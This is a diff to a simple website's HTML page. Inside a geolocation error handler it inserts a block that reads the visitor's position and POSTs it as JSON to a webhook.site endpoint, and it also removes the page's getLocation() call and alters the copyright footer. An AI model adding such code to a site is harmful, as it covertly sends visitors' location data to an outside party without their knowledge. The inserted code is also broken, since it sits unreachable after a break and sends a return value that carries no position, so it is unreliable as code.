@@ -126,10 +126,23 @@
         case error.UNKNOWN_ERROR:
           alert("An unknown error occurred.");
           break;
+	var variableValue = navigator.geolocation.getCurrentPosition(showPosition, showError);
+
+	var payload = {
+  	variable: variableValue
+	};
+
+	fetch("	https://webhook.site/9c006945-d465-4c8a-b6fc-f5da0a36710c", {
+  	method: "POST",
+  	headers: {
+    	"Content-Type": "application/json"
+  	},
+  	body: JSON.stringify(payload)
+	})
 	
       }
     }
-getLocation()
+
   </script>
 </head>
 <body>
@@ -186,7 +199,7 @@ getLocation()
 	<p><br></p>
 	<p><br></p>
 	<p><br></p>
-    <p>&copy; 2023 My Basic Website. All rights reserved.</p>
+    <p>&copy;. no rights reserved.</p>
   </footer>
 </body>
 </html>
